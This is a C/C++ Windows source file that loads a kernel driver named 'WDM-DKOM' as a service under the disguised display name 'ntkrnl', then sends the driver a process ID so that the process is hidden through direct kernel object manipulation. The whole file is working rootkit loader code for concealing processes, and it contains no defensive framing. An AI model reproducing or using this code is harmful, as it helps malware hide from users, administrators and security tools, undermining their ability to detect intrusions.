#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>


#define false 0
#define true 1

bool util_load_sysfile(char* driverName, char* displayName);
bool hideProcess(char* driverName, int pid);

int main(int argc, char *argv[])
{
	//if (argc < 2)
	//	printf("Not enougth arguments");
	//else
	char* driverName = "WDM-DKOM";
	char* displayName = "ntkrnl"; // friendly name
	if (util_load_sysfile(driverName, displayName))//"friendly driver"))//argv[1]);
		hideProcess(driverName, 4); //(int)argv[1]);
	else
		printf("failure\n");
	char s[100];
	std::cin >> s;

	return 0;
}

bool util_load_sysfile(char* driverName, char* displayName)
{
	// Open a handle to the SCM
	SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!sh)
	{
		printf("failed to open SCM(%d)\n", GetLastError());
		return false;
	}

	char currDir[515];
	GetCurrentDirectory(512, currDir);
	char path[1024];
	snprintf(path, 1022, "%s\\%s.sys", currDir, driverName); // string formatting
	printf("loading %s\n", path);

	SC_HANDLE rh = CreateService(sh, // Handle to SCManager
		driverName, // Service Name
		displayName, // Display Name
		SERVICE_ALL_ACCESS, // Desired Access
		SERVICE_KERNEL_DRIVER, // Service Type
		SERVICE_DEMAND_START, // Start Type
		SERVICE_ERROR_NORMAL, // Error Controle
		path, // Binary Path Name
		NULL, // Load OrderGroup
		NULL, // Tag Id
		NULL, // Dependencies
		NULL, // Service Start Name
		NULL); // Password

	printf("rh handled\n");
	if (!rh)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)
		{ // Service exists
			rh = OpenService(sh, driverName, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
			if (!rh)
			{
				CloseServiceHandle(sh);
				printf("couldn't get existing service handle(%d)]n", GetLastError());
				return false;
			}
		}
		else
		{
			CloseServiceHandle(sh);
			printf("couldn't start service(%d)\n", GetLastError());
			return false;
		}
	}
	printf("rh isnt null\n");

	// start the Driver
	if (0 == StartService(rh, 0, NULL) && ERROR_SERVICE_ALREADY_RUNNING != GetLastError())
	{
		printf("couldn't start driver(%d)\n", GetLastError());
		CloseServiceHandle(sh);
		CloseServiceHandle(rh);
		return false;
	}
	CloseServiceHandle(sh);
	CloseServiceHandle(rh);
	return true;
}

bool hideProcess(char * driverName, int pid)
{
	HANDLE hFile = CreateFile("\\\\.\\WDM-DKOM", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.", GetLastError());
		return false;
	}
	DWORD write;
	if (!WriteFile(hFile, &pid, sizeof(DWORD), &write, NULL)) // hide
	{
		printf("\nError: Unable to hide process (%d)\n", GetLastError());
	}
	else
	{
		printf("\nProcess successfully hidden.\n");
	}
}
